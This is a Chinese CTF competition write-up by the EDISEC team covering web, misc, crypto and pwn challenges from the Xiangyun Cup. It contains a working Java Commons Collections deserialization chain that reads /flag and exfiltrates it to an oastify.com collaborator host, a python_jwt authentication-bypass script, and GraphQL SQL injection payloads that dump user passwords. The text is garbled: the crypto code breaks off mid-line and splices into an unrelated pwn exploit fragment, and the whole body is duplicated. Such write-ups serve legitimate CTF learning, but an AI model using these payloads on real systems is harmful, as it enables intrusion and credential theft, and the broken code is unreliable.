# 第三届“祥云杯”CTF初赛WriteUp By EDISEC

> 原文: https://www.ctfiot.com/68739.html
> ID: 68739

秀米社团

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

ezjava

cc链 反弹shell curl wget都不行 读flag发送下

package com.ctf.ezjava;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class cc4 { public static void main(String[] args) throws Exception {
 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass("Cat"); String cmd = "String flag = "";n" + " String str;n" + " java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader("/flag"));n" + " while ((str = in.readLine()) != null) {n" + " flag += str;n" + " }"; cmd += "flag = flag.replace("{","");" + "flag = flag.replace("}","");"; cmd += "java.net.URL url = new java.net.URL("http://"+flag+".xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/");n" + "java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();n" + "con.setRequestMethod("GET");n" + "n" + " //添加请求头n" + " con.setRequestProperty("User-Agent", "feng");n" + " int responseCode = con.getResponseCode();"+ ""; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = "EvilCat" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错 // 写入.class 文件 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, "_bytecodes", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, "_name", "name"); setFieldValue(templates, "_class", null);
 /** * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个 */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) });
 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2,comparator);
 Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size"); size.setAccessible(true); size.set(queue,2);
 Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator);
 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4")); outputStream.writeObject(queue); outputStream.close();
 ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } }
 public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); }
 public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; }}

dns 请求获得flag

2

FunWEB

python_jwt cve 绕过认证

# import python_jwt as jwt, jwcrypto.jwk as jwk, datetimeimport python_jwt as jwtimport jwcrypto.jwk as jwk, datetime
from json import loads, dumpsfrom jwcrypto.common import base64url_decode, base64url_encodekey = jwk.JWK.generate(kty='RSA', size=2048)payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}old_payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}token = jwt.generate_jwt(payload, key, 'PS256', datetime.timedelta(minutes=5))token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"[header, payload, signature] = token.split('.')parsed_payload = loads(base64url_decode(payload))parsed_payload['is_admin'] = 1parsed_payload['exp'] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'print(token)header, claims = jwt.verify_jwt(token, key, ['PS256'])print(claims)print(old_payload)for k in payload: assert claims[k] == old_payload[k]

成功后 getflag提示需要管理员密码才能获得flag

获取所有类型 找到可以输⼊字符串的查询

query={ __schema { types { name } }}

判断出sql注入 然后发现是sqlite 找表找字段query={ getscoreusingnamehahaha(name: "admin' and 1 --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select sqlite_version() --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(name) from sqlite_master where type='table' --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(sql) from sqlite_master where type='table' and name='users'--+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid } }

POST /graphql HTTP/1.1Host: eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 118Origin: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comConnection: closeReferer: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.com/Cookie: token={" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwMDAwMDAwMDAsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjEsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ","signature":"ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"}X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid  } }# jlrSgkm4lHk1Ya43CaAQ

3

Rustwaf

02

Misc

1

strange_forensics

python3 volatility3/vol.py -f 1.mem banners.Bannersrogress: 100.00 PDB scanning finished Offset  Banner0x3e6001a0 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x3f191d94 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x710b7c88 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x7bd00010 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)

跑出内核版本，制作profile文件，参照如下

https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_FgLinux · volatilityfoundation/volatility Wiki (github.com)

$ git clone https://github.com/volatilityfoundation/dwarf2json$ cd dwarf2json/$ go buildwget <https://launchpad.net/ubuntu/+archive/primary/+files/linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb>git clone https://github.com/volatilityfoundation/volatility3.git
# 使用能适用该内核的操作系统 (ubuntu 18.04 / 20.04 / etc)$ docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash/# cd /volatility//volatility
# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility
# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility
# ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-84-generic > linux-image-5.4.0-84.94-generic.json $ cp linux-image-5.4.0-84.94-generic.json ./volatility3/volatility3/framework/symbols/linux

# 建立模拟环境cd ./volatility2/tools/linuxdocker run -it —rm -v $PWD:/volatility ubuntu:20.04 /bin/bash
# 安装必须环境apt updateapt install -y linux-headers-5.4.0-84-generic linux-image-5.4.0-84-generic dwarfdump build-essential vim zipcd /volatility/tools/linux/volatility/tools/linux
# make/volatility/tools/linux
# cd //volatility/tools/linux
# zip Linux-5.4.0-84-generic.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-84-generic/volatility/tools/linux
# exitmv Linux-5.4.0-84-generic.zip ./volatility2/volatility/plugins/overlays/linux

sudo volatility -f 1.mem --profile=LinuxUbuntu180484x64 linux_recover_filesystem -D filesystem

正解应该是分析桌面的app.py，去跑键盘监听的数据，这里我们也做出来了。

参考

CyberDefenders Write-up: CTF01. This is going to be my write-up for the… | by Nisarg Suthar | Medium

(TimeStamp_INT, 0 [Reserved], TimeStamp_DEC, 0 [Reserved], type, code [key pressed], value [press/release])

CTFtime.org / HSCTF 7 / Developer Input / Writeup

03

Crypto

1

little little fermat

from Crypto.Util.number import *def get_pl(): pl=[] for i in range(100,512): for j in range(10,512//4): for k in range(2,6):                pl.append((i+j)//k) pl=list(set(pl))    return plpl=get_pl()n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883e = 65537
def get_P(pl,n): for i in pl: for j in pl: t=(1<>(8*i))&0xff)
 choice(4) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive()
 # 
except Exception as e: # io.close() # continue # else: # continue

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
package com.ctf.ezjava;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
public class cc4 { public static void main(String[] args) throws Exception {
 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass("Cat"); String cmd = "String flag = "";n" + " String str;n" + " java.io.BufferedReader in = new java.io.BufferedReader(new java.io.FileReader("/flag"));n" + " while ((str = in.readLine()) != null) {n" + " flag += str;n" + " }"; cmd += "flag = flag.replace("{","");" + "flag = flag.replace("}","");"; cmd += "java.net.URL url = new java.net.URL("http://"+flag+".xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/");n" + "java.net.HttpURLConnection con = (java.net.HttpURLConnection) url.openConnection();n" + "con.setRequestMethod("GET");n" + "n" + " //添加请求头n" + " con.setRequestProperty("User-Agent", "feng");n" + " int responseCode = con.getResponseCode();"+ ""; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = "EvilCat" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错 // 写入.class 文件 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, "_bytecodes", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, "_name", "name"); setFieldValue(templates, "_class", null);
 /** * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个 */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) });
 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2,comparator);
 Field size = Class.forName("java.util.PriorityQueue").getDeclaredField("size"); size.setAccessible(true); size.set(queue,2);
 Field comparator_field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator);
 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc4")); outputStream.writeObject(queue); outputStream.close();
 ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc4")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } }
 public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); }
 public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; }}
# import python_jwt as jwt, jwcrypto.jwk as jwk, datetimeimport python_jwt as jwtimport jwcrypto.jwk as jwk, datetime
from json import loads, dumpsfrom jwcrypto.common import base64url_decode, base64url_encodekey = jwk.JWK.generate(kty='RSA', size=2048)payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}old_payload = { 'foo': 'bar', 'wup': 90 ,'sub': 'alice'}token = jwt.generate_jwt(payload, key, 'PS256', datetime.timedelta(minutes=5))token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"[header, payload, signature] = token.split('.')parsed_payload = loads(base64url_decode(payload))parsed_payload['is_admin'] = 1parsed_payload['exp'] = 2000000000fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))token = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'print(token)header, claims = jwt.verify_jwt(token, key, ['PS256'])print(claims)print(old_payload)for k in payload: assert claims[k] == old_payload[k]
query={ __schema { types { name } }}
判断出sql注入 然后发现是sqlite 找表找字段query={ getscoreusingnamehahaha(name: "admin' and 1 --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select sqlite_version() --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(name) from sqlite_master where type='table' --+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(sql) from sqlite_master where type='table' and name='users'--+"){ name score userid } }query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid } }
POST /graphql HTTP/1.1Host: eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 118Origin: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.comConnection: closeReferer: http://eci-2ze0xya70kbnpg3q73ta.cloudeci1.ichunqiu.com/Cookie: token={" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwMDAwMDAwMDAsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjEsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE2NjcwNjA4MzUsImlhdCI6MTY2NzA2MDUzNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiIzTENMV3pyR01NQTA0cS1ZWHlscnhRIiwibmJmIjoxNjY3MDYwNTM1LCJwYXNzd29yZCI6IjEiLCJ1c2VybmFtZSI6IjEifQ","signature":"ZPqmuKsrszmRoLtB2_5uIFoyZO-OoaLPuDbjOg9dX-so5hUAEkRFhRhBruE5x1E1mxiNwUGMfFanFEzrvA2IMXHmtRomg2cJANVWzBCIpxglElDFd3bKN-AONUqtICupDYC1sDMwLIm3COEMgl03kaWCcUqYOqO5GtAzGNguJLDO0iEoPgWid1FNvqZvdSa0ji7AnypnFiBJDn5thjATzwWhgj6UsLtMkhEOLRJnLPJimwb1CfZivcrT1yPgucFLXw5Dh4T9bk3cfre85JSW5jT9_2MIIwUZHtoJj1onU1b7I4u8iJ2zUC7WFvpkDCofMrRHyTU_XfLeOrePxACe6w"}X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1query={ getscoreusingnamehahaha(name: "a' union select group_concat(password) from users --+"){ name score userid  } }# jlrSgkm4lHk1Ya43CaAQ
python3 volatility3/vol.py -f 1.mem banners.Bannersrogress: 100.00 PDB scanning finished Offset  Banner0x3e6001a0 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x3f191d94 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x710b7c88 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)0x7bd00010 Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #94~18.04.1-Ubuntu SMP Thu Aug 26 23:17:46 UTC 2021 (Ubuntu 5.4.0-84.94~18.04.1-generic 5.4.133)
https://mp.weixin.qq.com/s/dbHGBzjcMoF8aPqIkCN_FgLinux · volatilityfoundation/volatility Wiki (github.com)
$ git clone https://github.com/volatilityfoundation/dwarf2json$ cd dwarf2json/$ go buildwget <https://launchpad.net/ubuntu/+archive/primary/+files/linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb>git clone https://github.com/volatilityfoundation/volatility3.git
# 使用能适用该内核的操作系统 (ubuntu 18.04 / 20.04 / etc)$ docker run -it --rm -v $PWD:/volatility ubuntu:18.04 /bin/bash/# cd /volatility//volatility
# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility
# dpkg -i linux-image-unsigned-5.4.0-84-generic-dbgsym_5.4.0-84.94_amd64.ddeb/volatility
# ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.4.0-84-generic > linux-image-5.4.0-84.94-generic.json $ cp linux-image-5.4.0-84.94-generic.json ./volatility3/volatility3/framework/symbols/linux
# 建立模拟环境cd ./volatility2/tools/linuxdocker run -it —rm -v $PWD:/volatility ubuntu:20.04 /bin/bash
# 安装必须环境apt updateapt install -y linux-headers-5.4.0-84-generic linux-image-5.4.0-84-generic dwarfdump build-essential vim zipcd /volatility/tools/linux/volatility/tools/linux
# make/volatility/tools/linux
# cd //volatility/tools/linux
# zip Linux-5.4.0-84-generic.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-84-generic/volatility/tools/linux
# exitmv Linux-5.4.0-84-generic.zip ./volatility2/volatility/plugins/overlays/linux
sudo volatility -f 1.mem --profile=LinuxUbuntu180484x64 linux_recover_filesystem -D filesystem
CyberDefenders Write-up: CTF01. This is going to be my write-up for the… | by Nisarg Suthar | Medium
(TimeStamp_INT, 0 [Reserved], TimeStamp_DEC, 0 [Reserved], type, code [key pressed], value [press/release])
CTFtime.org / HSCTF 7 / Developer Input / Writeup
from Crypto.Util.number import *def get_pl(): pl=[] for i in range(100,512): for j in range(10,512//4): for k in range(2,6):                pl.append((i+j)//k) pl=list(set(pl))    return plpl=get_pl()n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883e = 65537
def get_P(pl,n): for i in pl: for j in pl: t=(1<>(8*i))&0xff)
 choice(4) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive()
 # 
except Exception as e: # io.close() # continue # else: # continue
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667289155.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289157.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667289158.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667289159.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667289160.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667289161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667289161.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289162.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/0-1667289163.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1667289164.png)